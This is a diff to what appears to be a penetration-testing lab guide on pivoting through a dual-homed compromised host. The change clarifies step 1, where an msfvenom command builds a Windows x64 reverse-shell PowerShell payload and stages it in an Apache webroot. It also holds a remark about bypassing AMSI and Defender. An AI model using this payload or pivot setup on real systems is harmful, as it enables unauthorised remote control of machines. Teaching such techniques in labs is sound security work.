@@ -32,7 +32,7 @@ Additional Route Details:
 4. The unaltered MSFVenom payload is sufficient to bypass defenses such as AMSI and Defender. During real engagements default payloads like this should not be used. For the purposes of simplifying this example, we assume the payload will execute properly.
 ---
 ### Step-By-Step Instructions For Pivot
-1. (Kali) Make payload and place in apache default webroot
+1. (Kali) Make payload and place in apache default webroot. Note that the IP address in the command belongs to the Dual-Homed Compromised Host. In a later step we configure the Dual-Homed Compromised Host to forward the shell traffic to the attacker's Kali host.
 ```zsh
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.1.200 LPORT=8669 -f psh -o /var/www/html/win-x64-8669.txt;
 ```
